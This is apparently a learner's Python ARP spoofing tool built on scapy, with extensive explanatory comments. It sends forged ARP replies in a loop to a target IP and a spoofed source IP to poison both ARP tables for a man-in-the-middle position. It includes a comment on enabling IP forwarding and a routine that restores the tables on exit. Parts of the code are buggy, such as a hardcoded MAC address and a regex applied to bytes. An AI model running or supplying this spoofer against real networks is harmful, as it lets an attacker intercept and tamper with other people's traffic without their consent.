import scapy.all as scapy
import time
import sys
import argparse
import subprocess
import re
import os
from termcolor import colored
import pyfiglet

def Parser():
    parse = argparse.ArgumentParser()
    parse.add_argument("-t", "--target", dest="TargetIP", help=" Please Specify Target IP ")
    parse.add_argument("-s", "--spoof", dest="spoofIP", help=" Please Specify source IP ")
    options = parse.parse_args()
    if not options.TargetIP:
        parse.error(" Target IP has not been Specified ")
    if not options.spoofIP:
        parse.error(" Source IP has not been Specified ")
    return options


def spoof(target_ip, spoof_ip):
    # target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="00:11:7f:1b:8f:42", psrc=spoof_ip)
    # in this time we set pdst with Target IP so it will send a response to our target. pdst = destination IP
    # because we want to make an ARP response we said op to 2
    # hwdst is mac address destination
    # psrc is source Ip so whenver this packet is sent it will look like it coming from source ip and this is ip we are pretending to be
    # so when send ARP response it will update its ARP Table and to the mac address of attacker machine
    scapy.send(packet, verbose=False)
    # send is function in scaoy and packet is a packet we created
    # verbose=False when you don


def get_mac(ip):
    # here we write def to define a our func and call it scan and we define it a argument which is called ip
    arp = scapy.ARP(pdst=ip)
    # here we setting pdst which is ip field in ARP. now we are telling arp htat ip is ip we give to the function when we define the function to take an argument that is called ip
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_requst_broadcast = broadcast / arp
    # here we used a class in scapy called Ether which is used to specify Ether part because every network card has mac address and we need to makke sure it will to everyone on the network
    # we used also to make sure that the mac address is sent to broadcast not to only one device
    # to know the fields of any class in any function in scapy allo you have to do is scapy.ls(scapy.Ether) to know all fields in scapy.Ether

    answered = scapy.srp(arp_requst_broadcast, timeout=2, verbose=False)[0]
    # srp is a function in scapy which is used to send packets and we choosed srp because it send packets with ether part
    # srp will send packet we created and wait for the response and when response come it will return 2 sets of values
    # we put at the end [0] becasue srp return 2 lists and first list is answered list we choose the first element with [0]
    # verbose =False to tell python to print without details
    # set timeoneut to tell srp to wait for this amount of time if there is no respoinse then it will wait for this amount of time and move on
    return answered[0][1].hwsrc
    # so here it will return to where it get executed the [0] list which is the first list ( answered list )
    # and second element in the list [1] and .hwsrc stands for mac address


def restore(targer_ip, source_ip):
    dest_mac = get_mac(targer_ip)
    router_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=targer_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=router_mac)
    scapy.send(packet, verbose=False)

os.system("cls")
text_format = pyfiglet.figlet_format("ARPSPOOFER")
text_color = colored( text_format , "cyan")
print(text_color)
packet_count = 0
# here we set it to use in while loop so every time it loop execute it will count and store it in packet_count
try:
    while True:
        # here we are telling onlue while it is true make execute spoof function
        parser = Parser()
        spoof(parser.TargetIP, parser.spoofIP)
        spoof(parser.spoofIP, parser.TargetIP)
        packet_count = packet_count + 2
        print(colored("\r[+] sent packet " + str(packet_count), "blue")),
        sys.stdout.flush()
        time.sleep(2)
        # time.sleep to stop for 2 seconds so we don't send to many packets
        # don't forget to type sudo echo 1 > /proc/sys/net/ipv4/ip_forward
        # we tell python every time loop work increase value of packet_count by 1
        # here we put a comma after print function to tell if there is print funt to print everything in same line
        # here we \r to tell python to write everything from start of the line
        # here in python3 you dont need sys to print all you have to do write end-"" and leave string blan because we don't want ot put any characters
except :
    x = subprocess.check_output("arp -a  ", shell=True)
    route_resut = re.search("\d\d\d.\d\d\d.\d.1", x)
    parse = Parser()
    restore(parse.TargetIP, route_resut.group(0))
    print(colored("\n[+] Quitting & Restored ARP Table ", "red"))


